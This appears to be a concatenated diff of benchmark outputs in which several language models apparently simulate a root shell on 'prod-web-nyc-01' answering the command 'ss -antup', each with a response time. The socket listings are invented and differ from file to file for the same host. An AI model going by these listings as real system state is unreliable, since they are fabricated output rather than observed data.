+udp    UNCONN  0       0        0.0.0.0:68               0.0.0.0:*                users:(("systemd-networkd",pid=362,fd=16))
+udp    UNCONN  0       0        0.0.0.0:123              0.0.0.0:*                users:(("systemd-timesyn",pid=402,fd=17))
+udp    UNCONN  0       0        [::]:123                 [::]:*                   users:(("systemd-timesyn",pid=402,fd=18))
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 9-gpt.txt ---
+
+
+========================================
+--- START OF: 9-llama.txt ---
+========================================
+
+9-llama.txt
+Command: ss -antup
+Response Time: 17.16 seconds
+
+Response:
+Netid     State      Recv-Q     Send-Q           Local Address:Port           Peer Address:Port     Process                                         
+udp       UNCONN     0          0                    127.0.0.1:323                 0.0.0.0:*                                             
+udp       UNCONN     0          0                127.0.0.53%lo:53                 0.0.0.0:*                                             
+udp       UNCONN     0          0                      0.0.0.0:68                 0.0.0.0:*                                             
+udp       UNCONN     0          0                      0.0.0.0:631                0.0.0.0:*                                             
+udp       UNCONN     0          0                         [::]:323                      [::]:*                                             
+tcp       LISTEN     0          128                    0.0.0.0:22                 0.0.0.0:*                                             
+tcp       LISTEN     0          511                    0.0.0.0:80                 0.0.0.0:*                                             
+tcp       LISTEN     0          128                       [::]:22                      [::]:*                                             
+tcp       LISTEN     0          511                       [::]:80                      [::]:*                                             
+tcp       ESTAB      0          0                192.168.1.100:22              10.0.0.100:54321                                         
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 9-llama.txt ---
+
+
+========================================
+--- START OF: 9-sonnet.txt ---
+========================================
+
+9-sonnet.txt
+Command: ss -antup
+Response Time: 10.78 seconds
+
+Response:
+Netid State   Recv-Q Send-Q Local Address:Port     Peer Address:Port   Process
+udp   UNCONN 0      0      127.0.0.53%lo:53            0.0.0.0:*       users:(("systemd-resolve",pid=612,fd=12))
+udp   UNCONN 0      0            0.0.0.0:68            0.0.0.0:*       users:(("dhclient",pid=589,fd=6))
+tcp   LISTEN 0      128          0.0.0.0:22            0.0.0.0:*       users:(("sshd",pid=823,fd=3))
+tcp   LISTEN 0      511          0.0.0.0:80            0.0.0.0:*       users:(("nginx",pid=1456,fd=8),("nginx",pid=1455,fd=8))
+tcp   LISTEN 0      511          0.0.0.0:443           0.0.0.0:*       users:(("nginx",pid=1456,fd=9),("nginx",pid=1455,fd=9))
+tcp   LISTEN 0      128             [::]:22               [::]:*       users:(("sshd",pid=823,fd=4))
+tcp   ESTAB  0      0      10.142.0.5:22      203.0.113.42:54328  users:(("sshd",pid=3891,fd=4))
+tcp   LISTEN 0      511        127.0.0.1:8080          0.0.0.0:*       users:(("node",pid=1502,fd=19))
+root@prod-web-nyc-01:~#
+
+
+--- END OF: 9-sonnet.txt ---
